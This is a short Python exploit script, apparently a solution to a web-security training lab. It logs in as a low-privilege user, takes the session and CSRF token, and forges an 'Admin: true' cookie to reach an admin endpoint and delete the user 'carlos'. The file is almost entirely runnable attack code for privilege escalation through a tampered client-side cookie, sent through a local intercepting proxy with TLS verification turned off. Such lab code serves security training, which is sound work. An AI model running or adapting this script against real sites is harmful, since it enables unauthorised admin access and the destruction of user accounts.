import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def get_csrf_token(s, url):
  r = s.get(url , verify=False, proxies=proxies )
  soup = BeautifulSoup(r.text, 'html.parser')
  csrf = soup.find("input",{'name': 'csrf'})['value']
  return csrf


def delete_user(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    data = {"csrf": csrf_token,
            "username": "wiener",
            "password": "peter"}
    
    r = s.post(login_url, data= data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res : 
        print("[+] Giriş okey")
        my_url = url + "/my-account"
        r = s.get(my_url, verify=False, proxies=proxies)
        session_cookie = s.cookies.get_dict().get('session')

        delete_carlos_url = url + 'admin/delete?username=carlos'
        cookies = {'Admin': 'true', 'session' : session_cookie}
        r = requests.get(delete_carlos_url, cookies=cookies,verify=False, proxies=proxies )
        if r.status_code==200:
         print("[+] Carlos Delete Completed")
        else:
          print("[-] Carlos Delete Error")
          sys.exit(-1)

    
    else:
        print("[+] Giriş yok")
        sys.exit(-1)



if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    s = requests.Session()
    print("[+] Admin panel arıyorum.......")
    delete_user(s, url)

